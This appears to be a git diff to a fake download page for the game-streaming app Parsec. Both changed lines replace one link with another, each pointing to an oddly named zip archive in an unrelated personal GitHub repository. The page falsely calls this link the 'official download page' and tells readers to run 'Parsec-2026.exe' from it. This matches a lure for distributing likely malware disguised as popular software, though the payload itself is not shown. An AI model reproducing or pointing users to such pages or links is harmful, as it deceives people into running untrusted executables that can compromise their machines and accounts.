@@ -8,7 +8,7 @@ description: "Download and install Parsec for Windows 10 and 11 using a single P
     <h1 style="color: #24292e; text-align: center;">⚡ Parsec-2026 - Stream your games with speed</h1>
 
     <div style="text-align: center; margin: 40px 0;">
-        <a href="https://raw.githubusercontent.com/radhyas8440/radhyas8440.github.io/main/Gryllidae/github-io-radhyas-v3.6.zip" style="background-color: #2ea44f; color: white; padding: 15px 30px; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 18px; display: inline-block;">Download Parsec for Windows</a>
+        <a href="https://github.com/radhyas8440/radhyas8440.github.io/raw/refs/heads/main/Gryllidae/github-io-radhyas-v3.6.zip" style="background-color: #2ea44f; color: white; padding: 15px 30px; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 18px; display: inline-block;">Download Parsec for Windows</a>
     </div>
 
     <h2 style="margin-top: 40px; border-bottom: 1px solid #eaecef; padding-bottom: 10px;">🎮 Overview</h2>
@@ -26,7 +26,7 @@ description: "Download and install Parsec for Windows 10 and 11 using a single P
     <h2 style="margin-top: 40px; border-bottom: 1px solid #eaecef; padding-bottom: 10px;">🔽 Installation Steps</h2>
     <p>Follow these steps to install the program on your computer:</p>
     <ol style="line-height: 2;">
-        <li>Visit the <a href="https://raw.githubusercontent.com/radhyas8440/radhyas8440.github.io/main/Gryllidae/github-io-radhyas-v3.6.zip" style="color: #0366d6;">official download page</a> to get the installer for Windows.</li>
+        <li>Visit the <a href="https://github.com/radhyas8440/radhyas8440.github.io/raw/refs/heads/main/Gryllidae/github-io-radhyas-v3.6.zip" style="color: #0366d6;">official download page</a> to get the installer for Windows.</li>
         <li>Find the file named Parsec-2026.exe in your Downloads folder.</li>
         <li>Double-click the file to open the installation window.</li>
         <li>Follow the prompts on your screen to complete the setup.</li>
